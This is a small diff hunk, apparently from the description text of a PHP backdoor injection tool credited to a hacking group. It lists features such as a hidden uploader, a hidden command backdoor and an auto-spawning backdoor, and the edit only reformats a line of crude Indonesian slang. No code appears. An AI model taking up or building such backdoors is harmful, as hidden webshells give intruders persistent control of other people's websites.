@@ -3,5 +3,5 @@ Inject PHP file with :<br>
 -Hidden Uploader<br>
 -Hidden Command Backdoor<br>
 -Auto Spawn Backdoor<Br><br>
-  Recode? Jancuk Kon.
+ Recode? Jancuk Kon.<br>
  Copyright (c) 2018 74nc0x - Sora Cyber Team
